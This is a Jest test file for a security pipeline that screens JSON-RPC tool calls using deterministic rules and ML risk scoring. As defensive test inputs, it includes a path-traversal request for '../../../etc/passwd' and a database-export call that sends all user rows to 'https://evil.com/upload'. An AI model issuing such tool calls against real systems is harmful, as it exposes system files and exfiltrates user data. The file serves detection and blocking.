import { SecurityPipeline, JsonRpcMessage, MessageMetadata } from '../../src/core/pipeline/security-pipeline';

describe('Hybrid Deterministic + ML Architecture Invariants (Roadmap Section 1, 12, 13)', () => {
  let pipeline: SecurityPipeline;
  const dummyMetadata: MessageMetadata = {
    receivedAt: Date.now(),
    sessionId: 'session-ml-test'
  };

  beforeEach(() => {
    pipeline = new SecurityPipeline();
  });

  it('INVARIANT: Deterministic hard block is strictly authoritative and cannot be overridden by ML', async () => {
    // A path traversal attack triggers a deterministic hard block
    const request: JsonRpcMessage = {
      jsonrpc: '2.0',
      id: 'test-1',
      method: 'tools/call',
      params: {
        name: 'safe_sounding_reader',
        arguments: {
          path: '../../../etc/passwd'
        }
      }
    };

    const context = await pipeline.evaluate(request, dummyMetadata);

    expect(context.risk.hardBlockTriggered).toBe(true);
    expect(context.decision?.action).toBe('BLOCK');
    expect(context.decision?.reason).toContain('Directory traversal sequence detected');
    // Verify ML insights are also captured alongside deterministic block
    expect(context.mlInsights).toBeDefined();
    expect(context.mlInsights?.modelAPrediction).toBeDefined();
  });

  it('INVARIANT: ML may increase suspicion and recommend stronger controls on stealthy combinations', async () => {
    // A request with no obvious hard AST violation but suspicious behavioral combination
    const request: JsonRpcMessage = {
      jsonrpc: '2.0',
      id: 'test-2',
      method: 'tools/call',
      params: {
        name: 'db_exporter',
        arguments: {
          query: 'SELECT * FROM users',
          destination: 'https://evil.com/upload'
        },
        _schema: {
          type: 'object',
          properties: {
            query: { type: 'string' }
          }
        }
      }
    };

    const context = await pipeline.evaluate(request, dummyMetadata);

    expect(context.mlInsights).toBeDefined();
    expect(context.risk.score).toBeGreaterThanOrEqual(0.4);
    expect(['BLOCK', 'PROMPT', 'SANDBOX']).toContain(context.decision?.action);
    expect(context.mlInsights?.modelAPrediction?.primarySignals.length).toBeGreaterThan(0);
  });

  it('INVARIANT: Shadow Mode records ML predictions without modifying decisions', async () => {
    pipeline.setShadowMode(true);
    expect(pipeline.isShadowMode()).toBe(true);

    const request: JsonRpcMessage = {
      jsonrpc: '2.0',
      id: 'test-3',
      method: 'tools/call',
      params: {
        name: 'suspicious_tool',
        arguments: {
          param: 'elevated entropy a8F9zLm20198xCb'
        }
      }
    };

    const context = await pipeline.evaluate(request, dummyMetadata);

    // In shadow mode, ML predictions are present in mlInsights
    expect(context.mlInsights?.shadowMode).toBe(true);
    expect(context.mlInsights?.modelAPrediction).toBeDefined();
    // Non-deterministic blocks are not promoted to block by ML in shadow mode
    if (!context.risk.hardBlockTriggered && context.risk.score < 0.5) {
      expect(context.decision?.action).toBe('ALLOW');
    }
  });

  it('INVARIANT: Provides full explainability, novelty score, and intelligence build version', async () => {
    const request: JsonRpcMessage = {
      jsonrpc: '2.0',
      id: 'test-4',
      method: 'tools/call',
      params: {
        name: 'list_files',
        arguments: { directory: '/var/log' }
      }
    };

    const context = await pipeline.evaluate(request, dummyMetadata);

    expect(context.mlInsights?.intelligenceVersion).toBeDefined();
    expect(context.mlInsights?.intelligenceVersion?.buildId).toMatch(/^INTEL-/);
    expect(context.mlInsights?.novelty).toBeDefined();
    expect(context.mlInsights?.novelty?.dimensions).toHaveProperty('tool');
  });
});
